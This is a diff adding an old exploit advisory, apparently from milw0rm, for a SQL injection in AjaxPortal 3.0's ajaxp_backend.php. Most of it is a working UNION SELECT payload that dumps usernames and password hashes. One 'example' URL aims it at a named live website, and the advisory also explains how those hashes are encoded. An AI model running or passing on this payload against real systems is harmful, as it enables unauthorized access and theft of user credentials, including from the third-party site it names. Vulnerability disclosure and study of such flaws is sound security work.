@@ -1,0 +1,15 @@
+AjaxPortal 3.0 (ajaxp_backend.php page) Remote SQL Injection Vulnerability
+Bug found && Exploited by cOndemned
+Greetz: ZaBeaTy, d2, Beowulf, str0ke, Alfons Luja, 0in and others
+
+Proof of Concept : http://[host]/[ajaxportal-3.0_path]/ajaxp_backend.php?page=-1+union+select+1,concat_ws(char(58),username,password),3,4,5,6,7+from+PREFIX_users--
+
+Example : http://calmpc.net/ajaxp_backend.php?page=-1+union+select+1,concat_ws(char(58),username,password),3,4,5,6,7+from+dbPfixajaxp_users--
+
+
+Passwords are encoded using MySQL PASSWORD() function. (used algorithm depends on MySQL version.)
+
+
+// http://www.youtube.com/watch?v=dX_PLimGeHk&flip=1 :P
+
+# milw0rm.com [2009-04-01]
